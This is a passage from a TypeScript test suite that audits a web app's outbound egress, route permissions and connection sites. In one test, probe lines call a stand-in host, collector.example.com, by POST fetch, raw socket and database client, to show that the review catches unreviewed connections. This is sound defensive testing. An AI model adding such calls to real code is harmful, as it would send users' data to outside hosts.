const routeEntries = listRouteFiles(ROOT).map((file) => ({ path: routePathOf(ROOT, file), file: relative(ROOT, file).split("\\").join("/") }));
async function census(files: FileMap, routes: ReadonlyArray<{ path: string; file: string }>): Promise<EgressRow[]> {
  const rows: EgressRow[] = [];
  const models = modelEgressOf(files, routes); // [B23-A2 review] by binding, not by reachability (modelSending above)
  for (const { path, file } of routes) {
    const reached = closureOf(files, file).has(EGRESS);
    const exemption = CACHE_ONLY[path];
    const exempt = reached && exemption !== undefined && exemptionViolations(files, file, exemption).length === 0;
    const derived: OutboundEgress = reached && !exempt ? "observation-query" : "none"; rows.push({ path, file, reached, exempt, derived, value: TRANSFER_PATHS.has(path) ? "files" : derived, modelEgress: models.get(path)! }); // [B23-B1, 2026-10-03] files is declared by a transfer row, never derived (OD-182 (a)); case 4 pins that B1's reaches no boundary. [B23-B1 review, 2026-10-04] the closure-derived value is kept beside it. [B23-B2, 2026-10-04] since B2 it reaches the boundary, only through provider-egress.ts (case 4)
    await new Promise((resolve) => setImmediate(resolve)); // yield between walks (lead lesson 3: never block the worker for long)
  }
  return rows;
}
/** [B23-A2 review] Every module some route's closure reaches that holds a connection primitive, with its primitives. */
async function reachedTransports(files: FileMap, routes: ReadonlyArray<{ path: string; file: string }>): Promise<Map<string, readonly string[]>> {
  const out = new Map<string, readonly string[]>();
  for (const { file } of routes) {
    for (const member of closureOf(files, file)) {
      const primitives = transportsOf(files, member);
      if (primitives.length > 0) out.set(member, primitives);
    }
    await new Promise((resolve) => setImmediate(resolve));
  }
  return out;
}
/** [B23-A2 lead, 2026-10-02] Bindings a network package exports that open nothing: address classifiers, no connection site. */
const NON_CONNECTING: Readonly<Record<string, readonly string[]>> = { "node:net": ["isIP", "isIPv4", "isIPv6"], net: ["isIP", "isIPv4", "isIPv6"] };
/** [B23-A2 lead, 2026-10-02] The connection SITES `file` holds, counted so a second connection in an already-reviewed module fails the
 *  review: each global fetch (the rule `transportsOf` applies: a bare `fetch(...)` call, a `globalThis.fetch`-style reference); each
 *  runtime reference to a binding imported from a model SDK or a network package (a call, a construction, a class it extends or a
 *  hand-on alike; a namespace binding judged by the member it reads; a NON_CONNECTING classifier is no site); and each side-effect
 *  import, dynamic import, require or runtime re-export of such a package. Type positions are skipped. Stated limits: a binding taken
 *  from a dynamic import or a require is counted once, at the import; a global fetch held under another name is not seen (as in
 *  `transportsOf`); a local that shadows an imported binding is counted (an over-count, never a miss). */
function connectionSites(files: FileMap, file: string): number {
  const parsed = ts.createSourceFile(file, files.get(file)!, ts.ScriptTarget.Latest, true, file.endsWith("x") ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  const packageOf = (specifier: string): string | undefined => [...MODEL_SDKS, ...NETWORK_PACKAGES].find((pkg) => specifier === pkg || specifier.startsWith(`${pkg}/`));
  const bindings = new Map<string, readonly [string, string]>(); // local name -> [package, imported name | "default" | "*"]
  let sites = 0;
  for (const statement of parsed.statements) {
    if (ts.isImportDeclaration(statement) && ts.isStringLiteral(statement.moduleSpecifier)) {
      const pkg = packageOf(statement.moduleSpecifier.text);
      const clause = statement.importClause;
      if (pkg === undefined || clause?.isTypeOnly === true) continue;
      if (clause === undefined) { sites += 1; continue; }
      if (clause.name !== undefined) bindings.set(clause.name.text, [pkg, "default"]);
      const named = clause.namedBindings;
      if (named !== undefined && ts.isNamespaceImport(named)) bindings.set(named.name.text, [pkg, "*"]);
      if (named !== undefined && ts.isNamedImports(named)) for (const element of named.elements) if (!element.isTypeOnly) bindings.set(element.name.text, [pkg, (element.propertyName ?? element.name).text]);
    } else if (ts.isExportDeclaration(statement) && !statement.isTypeOnly && statement.moduleSpecifier !== undefined && ts.isStringLiteral(statement.moduleSpecifier) && packageOf(statement.moduleSpecifier.text) !== undefined) sites += 1;
  }
  const extendsValue = (node: ts.Node): boolean => ts.isExpressionWithTypeArguments(node) && ts.isHeritageClause(node.parent) && node.parent.token === ts.SyntaxKind.ExtendsKeyword && ts.isClassLike(node.parent.parent);
  const isMemberName = (node: ts.Identifier): boolean => {
    const parent = node.parent;
    return (ts.isPropertyAccessExpression(parent) && parent.name === node) || (ts.isQualifiedName(parent) && parent.right === node) || (ts.isBindingElement(parent) && parent.propertyName === node)
      || ((ts.isPropertyAssignment(parent) || ts.isPropertyDeclaration(parent) || ts.isMethodDeclaration(parent) || ts.isPropertySignature(parent) || ts.isGetAccessorDeclaration(parent) || ts.isSetAccessorDeclaration(parent) || ts.isEnumMember(parent)) && parent.name === node);
  };
  const visit = (node: ts.Node): void => {
    if (ts.isImportDeclaration(node) || ts.isInterfaceDeclaration(node) || ts.isTypeAliasDeclaration(node) || (ts.isTypeNode(node) && !extendsValue(node))) return;
    if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === "fetch") sites += 1;
    if (ts.isPropertyAccessExpression(node) && node.name.text === "fetch" && ts.isIdentifier(node.expression) && ["globalThis", "window", "self", "global"].includes(node.expression.text)) sites += 1;
    if (ts.isCallExpression(node) && (node.expression.kind === ts.SyntaxKind.ImportKeyword || (ts.isIdentifier(node.expression) && node.expression.text === "require"))
      && node.arguments[0] !== undefined && ts.isStringLiteralLike(node.arguments[0]) && packageOf(node.arguments[0].text) !== undefined) sites += 1;
    if (ts.isIdentifier(node) && bindings.has(node.text) && !isMemberName(node)) {
      const [pkg, imported] = bindings.get(node.text)!;
      const member = imported !== "*" ? imported : ts.isPropertyAccessExpression(node.parent) && node.parent.expression === node ? node.parent.name.text : "*";
      if (!(NON_CONNECTING[pkg]?.includes(member) ?? false)) sites += 1;
    }
    ts.forEachChild(node, visit);
  };
  visit(parsed);
  return sites;
}
/** [B23-A2 lead, 2026-10-02] What the review of one reached transport module finds wrong with it (empty: it holds as reviewed): an
 *  unreviewed module; a model SDK without the model-provider kind or the reverse; the boundary's kind elsewhere; no reason; and (the
 *  independent check of the review fixes) a primitive list or a number of connection sites other than the reviewed ones, a
 *  no-connection module that holds a site, or a reviewed transport with no site that is not no-connection. */
function transportViolations(files: FileMap, file: string, primitives: readonly string[]): string[] {
  const entry = TRANSPORTS[file];
  if (entry === undefined) return [`${file}: unreviewed transport (${primitives.join(",")})`];
  const out: string[] = [];
  if (primitives.some((primitive) => (MODEL_SDKS as readonly string[]).includes(primitive)) !== (entry.kind === "model-provider")) out.push(`${file}: a model SDK exactly when model-provider (${primitives.join(",")})`);
  if ((file === EGRESS) !== (entry.kind === "egress-boundary")) out.push(`${file}: the egress boundary exactly when egress-boundary`);
  if (entry.reason.length <= 30) out.push(`${file}: no reason`);
  const reviewed = [...entry.primitives].sort().join(",");
  if ([...primitives].sort().join(",") !== reviewed) out.push(`${file}: primitives ${[...primitives].sort().join(",")} (reviewed ${reviewed})`);
  const sites = connectionSites(files, file);
  if (sites !== entry.sites) out.push(`${file}: ${sites} connection site(s) (reviewed ${entry.sites})`);
  if (entry.kind === "no-connection" && sites > 0) out.push(`${file}: no-connection holds ${sites} connection site(s)`);
  if (entry.kind !== "no-connection" && entry.sites === 0) out.push(`${file}: a reviewed transport with no connection site is no-connection`);
  return out;
}
let production: FileMap | null = null;
const productionFiles = (): FileMap => (production ??= collectProductionFiles(ROOT));
let derived: Promise<EgressRow[]> | null = null;
const derivedCensus = (): Promise<EgressRow[]> => (derived ??= census(productionFiles(), routeEntries));

/** The committed CSV's cells (a quoted cell may hold a comma). */
function csvRows(): string[][] {
  const lines = read(CSV).split(NEWLINE).filter((line) => line !== "");
  return lines.map((line) => {
    const out: string[] = [];
    let cell = "";
    let quoted = false;
    for (let index = 0; index < line.length; index += 1) {
      const character = line[index]!;
      if (quoted) {
        if (character === '"' && line[index + 1] === '"') { cell += '"'; index += 1; }
        else if (character === '"') quoted = false;
        else cell += character;
      } else if (character === '"') quoted = true;
      else if (character === ",") { out.push(cell); cell = ""; }
      else cell += character;
    }
    out.push(cell);
    return out;
  });
}

/** A sound transfer row: human session, project administrators only, CSRF, authenticated. */
const TRANSFER: RoutePolicy = {
  path: "/api/b23-probe/transfer", method: "POST", authClass: "authenticated-mutation", identitySource: "trusted-context", requiresAuth: true,
  permittedRoles: ["project_admin"], providerCredit: false, requiresCsrf: true, authoritativeWrite: false, releaseOrQualification: false,
  externalTransfer: true, spend: false, evidence: "test: a forged transfer row",
};

describe("[B23-A2] the route vocabulary (OD-174)", () => {
  it("1. every policy row carries explicit externalTransfer and spend booleans; no row is either in A2 ([B23-B1, 2026-10-03] B1's provider exchange is the one externalTransfer row; none is spend); the two releaseOrQualification rows are unchanged; the gates pass on the table", () => {
    const policies = allRoutePolicies();
    expect(policies).toHaveLength(166); // [B23-B1, 2026-10-03] reviewed census move (OD-174), was 165
    for (const policy of policies) {
      expect(typeof policy.externalTransfer, `${policy.method} ${policy.path}`).toBe("boolean");
      expect(typeof policy.spend, `${policy.method} ${policy.path}`).toBe("boolean");
    }
    expect(policies.filter((policy) => policy.externalTransfer || policy.spend).map((policy) => `${policy.method} ${policy.path}:${String(policy.externalTransfer)}/${String(policy.spend)}`)).toEqual(["POST /api/pcb/provider-exchange:true/false"]); // [B23-B1, 2026-10-03] was []: the provider exchange is B1's transfer row
    expect(policies.filter((policy) => policy.releaseOrQualification).map((policy) => policy.path).sort()).toEqual(["/api/pcb/qualify", "/api/pcb/release"]);
    expect(policyFor("/api/pcb/release", "POST")).toMatchObject({ releaseOrQualification: true, externalTransfer: false, spend: false, permittedRoles: ["project_admin"] });
    expect([...ROUTE_VOCABULARY_VIOLATIONS]).toEqual(["flags_not_explicit", "spend_in_b23", "public", "not_human_session", "no_csrf", "any_member", "viewer_or_commenter", "automation", "release_vocabulary"]);
    expect(routeVocabularyViolations()).toEqual([]);
  });

  it("2. the gates bite: a transfer row that is public, outside a human session, CSRF-free, open to any member, a viewer, a commenter or automation, or that reuses releaseOrQualification is refused; a spend row is refused in B23 whatever its shape; a missing flag is refused; a sound transfer row passes", () => {
    const key = `${TRANSFER.method} ${TRANSFER.path}`;
    expect(routeVocabularyViolations([TRANSFER])).toEqual([]);
    const cases: Array<[string, RoutePolicy, string[]]> = [
      ["public", { ...TRANSFER, authClass: "public", identitySource: "none", requiresAuth: false, permittedRoles: [] }, ["public", "not_human_session", "any_member"]],
      ["a worker secret", { ...TRANSFER, authClass: "internal-worker", identitySource: "worker-secret" }, ["not_human_session"]],
      ["an MCP bearer", { ...TRANSFER, authClass: "authenticated-mcp", identitySource: "mcp-bearer" }, ["not_human_session"]],
      ["a body-scope server actor", { ...TRANSFER, identitySource: "body-scope-server-actor" }, ["not_human_session"]],
      ["no CSRF", { ...TRANSFER, requiresCsrf: false }, ["no_csrf"]],
      ["any member", { ...TRANSFER, permittedRoles: [] }, ["any_member"]],
      ["a viewer", { ...TRANSFER, permittedRoles: ["project_admin", "viewer"] }, ["viewer_or_commenter"]],
      ["a commenter", { ...TRANSFER, permittedRoles: ["commenter", "project_admin"] }, ["viewer_or_commenter"]],
      ["automation", { ...TRANSFER, permittedRoles: ["automation", "project_admin"] }, ["automation"]],
      ["the release vocabulary", { ...TRANSFER, releaseOrQualification: true }, ["release_vocabulary"]],
      ["a spend row, otherwise sound", { ...TRANSFER, externalTransfer: false, spend: true }, ["spend_in_b23"]],
      ["a spend row open to automation", { ...TRANSFER, externalTransfer: false, spend: true, permittedRoles: ["automation"] }, ["spend_in_b23", "automation"]],
      ["a missing flag", { ...TRANSFER, externalTransfer: undefined as unknown as boolean }, ["flags_not_explicit"]],
      ["a truthy non-boolean", { ...TRANSFER, spend: "yes" as unknown as boolean }, ["flags_not_explicit"]],
    ];
    for (const [label, row, reasons] of cases) expect(routeVocabularyViolations([row]), label).toEqual(reasons.map((reason) => `${key}: ${reason}`));
    // a production row forged into a transfer: the agent-reachable chat row is refused for its identity, its roles and its automation
    const chat = { ...policyFor("/api/chat", "POST")!, externalTransfer: true };
    expect(routeVocabularyViolations([chat])).toEqual(["POST /api/chat: not_human_session", "POST /api/chat: automation"]);
  });

  it("3. outboundEgress is a closed vocabulary on every classification row and the CSV's last column (external_process stays at index 6); files only with a transfer row and a transfer row only with files; no public row sends an observation query or files, and a public row that sends a model input is reviewed; no row sends files in A2 ([B23-B1, 2026-10-03] B1's provider exchange is the one files row)", () => {
    expect([...OUTBOUND_EGRESS]).toEqual(["none", "observation-query", "files"]);
    const rows = routeResourceClassification();
    expect(rows).toHaveLength(166); // [B23-B1, 2026-10-03] reviewed census move (OD-174), was 165
    for (const row of rows) expect(OUTBOUND_EGRESS, `${row.method} ${row.path}`).toContain(row.outboundEgress);
    expect(rows.filter((row) => row.outboundEgress === "files").map((row) => `${row.method} ${row.path}`)).toEqual(["POST /api/pcb/provider-exchange"]); // [B23-B1, 2026-10-03] was []: declared by B1's transfer row
    expect(rows.filter((row) => row.isPublic && row.outboundEgress !== "none")).toEqual([]);
    expect(outboundEgressViolations()).toEqual([]);
    const header = csvRows()[0]!;
    expect(header.indexOf("path")).toBe(0);
    expect(header.indexOf("external_process")).toBe(6);
    expect(header.slice(-2)).toEqual(["outbound_egress", "model_egress"]); // [B23-A2 review] + model_egress, the last column
    expect(read(CSV)).toBe(renderRouteResourceClassificationCsv());
    // the gates bite on forged tables
    const query = rows.find((row) => row.path === "/api/bom")!;
    const policies = allRoutePolicies();
    expect(outboundEgressViolations([{ ...query, outboundEgress: "files" }], policies)).toEqual(["POST /api/bom: files_without_transfer"]);
    expect(outboundEgressViolations([{ ...query, outboundEgress: "uploads" as OutboundEgress }], policies)).toEqual(["POST /api/bom: unknown_value"]);
    expect(outboundEgressViolations([{ ...query, isPublic: true }], policies)).toEqual(["POST /api/bom: public_sends"]);
    const transferPolicies = policies.map((policy) => (policy.path === "/api/bom" ? { ...policy, externalTransfer: true } : policy));
    expect(outboundEgressViolations([query], transferPolicies)).toEqual(["POST /api/bom: transfer_without_files"]);
    expect(outboundEgressViolations([{ ...query, outboundEgress: "files" }], transferPolicies)).toEqual([]);
    // [B23-A2 review security-2] a public row that may send a model input is one of the reviewed paths, or a violation; the
    // review list holds exactly the public paths that do (case 8 derives them)
    expect(rows.filter((row) => row.isPublic && row.modelEgress).map((row) => row.path).sort()).toEqual(Object.keys(PUBLIC_MODEL_EGRESS).sort());
    const publicCatalog = rows.find((row) => row.isPublic && row.modelEgress === false && row.outboundEgress === "none")!;
    expect(outboundEgressViolations([{ ...publicCatalog, modelEgress: true }], policies)).toEqual([`${publicCatalog.method} ${publicCatalog.path}: public_model_egress`]);
    expect(outboundEgressViolations([{ ...publicCatalog, modelEgress: "yes" as unknown as boolean }], policies)).toEqual([`${publicCatalog.method} ${publicCatalog.path}: unknown_value`]);
    for (const [path, reason] of Object.entries(PUBLIC_MODEL_EGRESS)) expect(reason.length, path).toBeGreaterThan(40);
  });

  it("4. the census: every path's outboundEgress (every method row, and the CSV) equals the value derived from its runtime import closure reaching the egress boundary, with the reviewed cache-only exemptions ([B23-B1 review, 2026-10-04] except a transfer path: its files is declared by its policy row, checked against the reviewed transfer list, and its closure-derived value is pinned beside it), and its modelEgress the value derived from its handler bindings; the derivation walks the gates' edges", { timeout: 120_000 }, async () => {
    const census = await derivedCensus();
    expect(census.map((row) => row.path).sort()).toEqual([...new Set(routeResourceClassification().map((row) => row.path))].sort());
    expect(census.filter((row) => row.value === "observation-query").map((row) => row.path).sort()).toEqual(QUERY_PATHS);
    expect(census.filter((row) => row.exempt).map((row) => row.path).sort()).toEqual(Object.keys(CACHE_ONLY).sort());
    const byPath = new Map(census.map((row) => [row.path, row.value])); expect(routeResourceClassification().filter((row) => row.outboundEgress !== byPath.get(row.path)).map((row) => `${row.method} ${row.path}: ${row.outboundEgress} (census ${String(byPath.get(row.path))})`)).toEqual([]); // [B23-B1 review, 2026-10-04] tests-5: every row at once, before the pins
    expect(census.filter((row) => row.value === "files").map(({ path, reached, derived }) => ({ path, reached, derived }))).toEqual([{ path: "/api/pcb/provider-exchange", reached: true, derived: "observation-query" }]); expect(closureOf(productionFiles(), "app/api/pcb/provider-exchange/route.ts", new Set(["app/lib/manufacturing-providers/provider-egress.ts"])).has(EGRESS), "the transfer route reaches the boundary only through provider-egress.ts").toBe(false); // [B23-B1, 2026-10-03] the transfer row's closure reaches no egress boundary in B1: the send is B2's. [B23-B1 review, 2026-10-04] its closure-derived value too: a transfer route that also sent a query could not hide behind files. [B23-B2, 2026-10-04] reviewed pin move (was reached: false, derived: "none"): since B2 the closure reaches the boundary through the one sending module, so its derived value is observation-query beside the declared files; the same line pins that with provider-egress.ts bridged it reaches the boundary nowhere else, so a query sent around the send still cannot hide behind files (b23-b-egress-import-gate case 3)
    for (const row of routeResourceClassification()) expect(row.outboundEgress, `${row.method} ${row.path}`).toBe(byPath.get(row.path));
    const [header, ...body] = csvRows();
    const pathIndex = header!.indexOf("path");
    const egressIndex = header!.indexOf("outbound_egress");
    for (const cells of body) expect(cells[egressIndex], cells[pathIndex]).toBe(byPath.get(cells[pathIndex]!));
    // [B23-A2 review regressions-1] model egress, derived the same way: every row and CSV cell equals its path's derived value
    const modelByPath = new Map(census.map((row) => [row.path, row.modelEgress]));
    expect(routeResourceClassification().filter((row) => row.modelEgress !== modelByPath.get(row.path)).map((row) => `${row.method} ${row.path}: ${String(row.modelEgress)} (derived ${String(modelByPath.get(row.path))})`)).toEqual([]);
    const modelIndex = header!.indexOf("model_egress");
    for (const cells of body) expect(cells[modelIndex], cells[pathIndex]).toBe(String(modelByPath.get(cells[pathIndex]!)));
    // the derivation's closure is exactly importClosure's for every route that reaches the boundary
    const files = productionFiles();
    for (const row of census.filter((candidate) => candidate.reached)) expect([...closureOf(files, row.file)].sort(), row.path).toEqual([...importClosure(files, [row.file]).keys()].sort());
  });

  it("5. the exemptions hold: each cache-only route reaches the boundary only through the pricing gateway, is the gateway's one importer in its closure, imports only its reviewed names and calls the pricing function without a grant; the gateway's cache-only default is pinned at its source", { timeout: 120_000 }, () => {
    const files = productionFiles();
    for (const [path, exemption] of Object.entries(CACHE_ONLY)) {
      const entry = routeEntries.find((candidate) => candidate.path === path)!;
      expect(entry, path).toBeDefined();
      expect(policyFor(path, "POST"), path).toMatchObject({ authClass: "public", providerCredit: false, externalTransfer: false, spend: false });
      expect(closureOf(files, entry.file).has(EGRESS), `${path} reaches the boundary`).toBe(true);
      expect(exemptionViolations(files, entry.file, exemption), path).toEqual([]);
      expect(exemption.reason.length, path).toBeGreaterThan(40);
    }
    const builder = files.get("app/lib/bom-builder.ts")!;
    expect(builder).toMatch(/export async function buildBomRows\(\n[^)]*pricing: \{ live\?: boolean; forceRefresh\?: boolean \} = \{\},/);
    expect(builder.split("buildBom(").length - 1).toBe(1);
    expect(builder).toContain("return buildBom(state, pricingChoice, pricing, {}, options);");
    const build = files.get("app/lib/bom/build.ts")!;
    expect(build).toMatch(/export async function buildBom\(\n[^)]*pricing: \{ live\?: boolean; forceRefresh\?: boolean \} = \{\},/);
    expect(build.split("getPricingFor(").length - 1).toBe(1);
    expect(build).toContain("getPricingFor(partsForPricing, pricingChoice, { live: pricing.live === true, forceRefresh: pricing.forceRefresh === true })");
    expect(files.get("app/lib/distributors/index.ts")!).toContain("const livePricing = opts.live === true;");
    // the gateway reaches the boundary only through the distributor index (bridged there, the build reaches none)
    expect(closureOf(files, "app/lib/bom/build.ts", new Set(["app/lib/distributors/index.ts"])).has(EGRESS)).toBe(false);
    // [B23-A2 review tests-3] and its own edges are the reviewed ones: the builder imports only the build, the build is the index's
    // one importer in the gateway, imports exactly the reviewed names from it and makes exactly the pinned pricing call
    expect(gatewayViolations(files)).toEqual([]);
    expect(edgesOf(files, "app/lib/bom-builder.ts")).toEqual(["app/lib/bom/build.ts"]);
    expect(namedImportsFrom(files, "app/lib/bom/build.ts", [DISTRIBUTOR_INDEX]).names).toEqual(BUILD_INDEX_NAMES);
  });

  it("6. tripwire: a synthetic route reaching the boundary through a hop derives observation-query; a cache-only route loses its exemption when it passes a pricing grant, spreads its arguments, hands the pricing function on, imports an unreviewed name or the whole gateway, reaches the boundary around the gateway, or when a helper in its closure imports the gateway", { timeout: 120_000 }, async () => {
    const files = productionFiles();
    const injected = new Map(files);
    injected.set("app/api/b23-probe/route.ts", 'import { lookUp } from "./hop";\nexport const POST = () => lookUp();\n');
    injected.set("app/api/b23-probe/hop.ts", 'import { outboundFetch } from "@/app/lib/net/outbound-fetch";\nexport const lookUp = () => outboundFetch;\n');
    expect(await census(injected, [{ path: "/api/b23-probe", file: "app/api/b23-probe/route.ts" }])).toEqual([{ path: "/api/b23-probe", file: "app/api/b23-probe/route.ts", reached: true, exempt: false, derived: "observation-query", value: "observation-query", modelEgress: false }]); // [B23-B1 review, 2026-10-04] the row now carries its closure-derived value too (case 4)
    const route = "app/api/bom/cart/digikey/route.ts";
    const entry = [{ path: "/api/bom/cart/digikey", file: route }];
    expect((await census(files, entry))[0]).toMatchObject({ reached: true, exempt: true, value: "none" });
    const call = "await buildBomRows(stateCheck.state, normalizeChoice(body.pricingChoice));";
    expect(files.get(route)!.split(call).length - 1).toBe(1);
    const mutated = (file: string, from: string, to: string): FileMap => {
      const source = files.get(file)!;
      expect(source.split(from).length - 1, `${file}: ${from}`).toBe(1);
      return new Map(files).set(file, source.replace(from, to));
    };
    const loses = async (changed: FileMap, reason: string): Promise<void> => {
      expect(exemptionViolations(changed, route, CACHE_ONLY["/api/bom/cart/digikey"]!), reason).toContain(reason);
      expect((await census(changed, entry))[0], reason).toMatchObject({ reached: true, exempt: false, value: "observation-query" });
    };
    await loses(mutated(route, call, "await buildBomRows(stateCheck.state, normalizeChoice(body.pricingChoice), { live: true });"), "PRICING_GRANT:buildBomRows");
    await loses(mutated(route, call, "await buildBomRows(...([stateCheck.state, normalizeChoice(body.pricingChoice)] as const));"), "PRICING_GRANT:buildBomRows");
    await loses(mutated(route, call, "await [buildBomRows].map((build) => build(stateCheck.state, normalizeChoice(body.pricingChoice)))[0]!;"), "OPAQUE_USE:buildBomRows");
    await loses(mutated(route, 'import { bomStateRefusal, buildBomRows, checkBomState, normalizeChoice } from "@/app/lib/bom-builder";', 'import { VALID_CHOICES, bomStateRefusal, buildBomRows, checkBomState, normalizeChoice } from "@/app/lib/bom-builder";\nvoid VALID_CHOICES;'), "UNREVIEWED_IMPORT:VALID_CHOICES");
    await loses(mutated(route, 'import { bomStateRefusal, buildBomRows, checkBomState, normalizeChoice } from "@/app/lib/bom-builder";', 'import { bomStateRefusal, buildBomRows, checkBomState, normalizeChoice } from "@/app/lib/bom-builder";\nimport * as gateway from "@/app/lib/bom-builder";\nvoid gateway;'), "OPAQUE_GATEWAY_USE:namespace-import");
    await loses(new Map(files).set(route, `${files.get(route)!}\nimport { getPricingFor } from "@/app/lib/distributors";\nexport const PATCH = getPricingFor;\n`), "AROUND_THE_GATEWAY");
    const failure = "app/api/bom/_failure.ts";
    expect(closureOf(files, route).has(failure)).toBe(true);
    await loses(new Map(files).set(failure, `${files.get(failure)!}\nimport { buildBomRows as again } from "@/app/lib/bom-builder";\nexport const retry = () => again({} as never, "all", { live: true });\n`), `GATEWAY_IMPORTER:${failure}`);
    // [B23-A2 review tests-3] a live call added INSIDE the gateway costs the exemption too (the checks above bridge the gateway):
    // (A) the builder asking the distributor index live itself, (B) the build importing and calling another live lookup, (C) a
    // second pricing call in the build, and (D) the one call passing a grant
    const builderImport = 'import { buildBom, type BomBuildOptions, type BomResult } from "@/app/lib/bom/build";';
    await loses(mutated("app/lib/bom-builder.ts", builderImport, `${builderImport}\nimport { getPricingFor } from "@/app/lib/distributors";\nexport const livePrices = (parts: never) => getPricingFor(parts, "all", { live: true });`), "BUILDER_EDGES:app/lib/bom/build.ts,app/lib/distributors/index.ts");
    const indexImport = "  getPricingFor,\n  pausedSources,";
    const withLookup = mutated("app/lib/bom/build.ts", indexImport, "  getPricingFor,\n  lookupExactMpns,\n  pausedSources,");
    await loses(withLookup.set("app/lib/bom/build.ts", `${withLookup.get("app/lib/bom/build.ts")!}\nexport const exact = (mpns: never) => lookupExactMpns(mpns, { live: true });\n`), "UNREVIEWED_INDEX_IMPORT:lookupExactMpns");
    const second = mutated("app/lib/bom/build.ts", indexImport, indexImport);
    await loses(second.set("app/lib/bom/build.ts", `${second.get("app/lib/bom/build.ts")!}\nexport const again = (parts: never) => getPricingFor(parts, "all", { live: true });\n`), "PRICING_CALLS:2");
    await loses(mutated("app/lib/bom/build.ts", "{ live: pricing.live === true, forceRefresh", "{ live: true, forceRefresh"), "PRICING_CALLS:1");
  });

  it("7. [B23-B1, 2026-10-03] one route was added (the provider exchange; A2 added none): 166 classified rows over the route files (the census is 166 / 163 / 3 / 0, b16-1c-invariant-tripwires), and the policy table is the route tree", () => {
    expect(routeResourceClassification()).toHaveLength(166); // [B23-B1, 2026-10-03] reviewed census move (OD-174), was 165
    expect(routeEntries.map((entry) => entry.path).sort()).toEqual([...new Set(allRoutePolicies().map((policy) => policy.path))].sort());
  });

  it("8. what leaves Sirkit, by transport: every module a route can reach that can open a connection is reviewed (the egress boundary, the model-provider SDK clients, Sirkit's own store, or none) [B23-A2 lead, 2026-10-02] with its exact primitives and connection sites, so a new connection in a reviewed module fails too; `modelEgress` is derived from a model SDK client, so an LLM prompt carrying design data is never `none` and nothing; the two public catalogue searches are the reviewed public model egress", { timeout: 120_000 }, async () => {
    const files = productionFiles();
    const reached = await reachedTransports(files, routeEntries);
    expect([...reached.keys()].sort(), "every reached connection primitive is reviewed, and no review is stale").toEqual(Object.keys(TRANSPORTS).sort());
    expect([...reached].flatMap(([file, primitives]) => transportViolations(files, file, primitives)), "every reached transport holds as reviewed").toEqual([]);
    expect(reached.get(EGRESS)).toEqual(["fetch"]);
    // [B23-A2 lead, 2026-10-02] the census reviews PRIMITIVES, not only modules (the independent check): a new connection added to an
    // already-reviewed module - a third-party fetch in Sirkit's own-store client, in the no-connection address classifier or beside a
    // model SDK client, a second fetch beside the reviewed one, a socket opened through the classifier's own package, a second store
    // client - fails the review; a line that opens nothing (a constant, another classifier) does not. In an injected map: nothing is written.
    const COLLECTOR = 'void fetch("https://collector.example.com", { method: "POST", body: JSON.stringify({ probe: 1 }) });';
    const injections: ReadonlyArray<readonly [string, string, string, readonly string[]]> = [
      ["a third-party fetch in Sirkit's own-store client", "app/lib/db/client.ts", COLLECTOR, ["app/lib/db/client.ts: 2 connection site(s) (reviewed 1)", "app/lib/db/client.ts: primitives fetch,postgres (reviewed postgres)"]],
      ["a third-party fetch in the no-connection classifier", "app/lib/net/ip-policy.ts", COLLECTOR, ["app/lib/net/ip-policy.ts: 1 connection site(s) (reviewed 0)", "app/lib/net/ip-policy.ts: no-connection holds 1 connection site(s)", "app/lib/net/ip-policy.ts: primitives fetch,node:net (reviewed node:net)"]],
      ["a third-party fetch beside a model SDK client", "app/lib/embeddings.ts", COLLECTOR, ["app/lib/embeddings.ts: 2 connection site(s) (reviewed 1)", "app/lib/embeddings.ts: primitives fetch,openai (reviewed openai)"]],
      ["a second fetch beside the reviewed one", "app/lib/auth/bounded-fetch.ts", 'void globalThis.fetch("https://collector.example.com");', ["app/lib/auth/bounded-fetch.ts: 2 connection site(s) (reviewed 1)"]],
      ["a socket through the classifier's own package", "app/lib/net/ip-policy.ts", 'import { connect } from "node:net";\nexport const probe = () => connect(443, "collector.example.com");', ["app/lib/net/ip-policy.ts: 1 connection site(s) (reviewed 0)", "app/lib/net/ip-policy.ts: no-connection holds 1 connection site(s)"]],
      ["a second store client to another host", "app/lib/db/client.ts", 'export const collector = postgres("postgres://collector.example.com/probe");', ["app/lib/db/client.ts: 2 connection site(s) (reviewed 1)"]],
      ["control: a constant in the store client", "app/lib/db/client.ts", "export const PROBE = 1;", []],
      ["control: another classifier from the same package", "app/lib/net/ip-policy.ts", 'import { isIPv4 } from "node:net";\nexport const probe = (value: string) => isIPv4(value);', []],
    ];
    const misjudged: string[] = [];
    for (const [label, file, appended, expected] of injections) {
      const injected: FileMap = new Map(files).set(file, `${files.get(file)!}${NEWLINE}${appended}${NEWLINE}`);
      const found = transportViolations(injected, file, transportsOf(injected, file)).sort();
      if (JSON.stringify(found) !== JSON.stringify([...expected].sort())) misjudged.push(`${label}: found [${found.join("; ")}]`);
    }
    expect(misjudged, "every injected connection fails the review, and a line that opens nothing does not").toEqual([]);
    // a same-origin module's every global fetch names a Sirkit path (a literal, or a top-level constant, beginning with "/")
    for (const [file] of Object.entries(TRANSPORTS).filter(([, entry]) => entry.kind === "same-origin")) expect(crossOriginFetches(files, file), file).toEqual([]);
    // the findings' rows: an LLM prompt with design data is model egress; the public search embeds the anonymous caller's query
    const rows = routeResourceClassification();
    const row = (path: string, method = "POST") => rows.find((candidate) => candidate.path === path && candidate.method === method)!;
    for (const path of ["/api/schematic/edit", "/api/schematic/review", "/api/pcb/repair/agent", "/api/spice/ai", "/api/chat"]) expect(row(path), path).toMatchObject({ modelEgress: true });
    expect(row("/api/parts/search")).toMatchObject({ isPublic: true, outboundEgress: "none", modelEgress: true });
    expect(row("/api/pcb/footprints/search", "GET"), "found by the derivation beside the reviewers' row").toMatchObject({ isPublic: true, outboundEgress: "none", modelEgress: true });
    expect(Object.keys(PUBLIC_MODEL_EGRESS).sort()).toEqual(["/api/parts/search", "/api/pcb/footprints/search"]);
    // reachability alone would mark nearly every route: the DB schema imports the embedding module's dimension constant
    expect(closureOf(files, "app/api/pcb-sync/route.ts").has("app/lib/embeddings.ts"), "the schema's constant reaches the OpenAI client module").toBe(true);
    expect(row("/api/pcb-sync"), "but no handler binding sends a model input").toMatchObject({ modelEgress: false });
    // the derivation is not vacuous: through a hop, a handler that calls an SDK client is model egress and one that only reads a
    // constant beside it is not; a module calling a sending binding at import sends for every route that reaches it; a route
    // reaching a new transport fails the review
    const probe = [{ path: "/api/b23-probe", file: "app/api/b23-probe/route.ts" }];
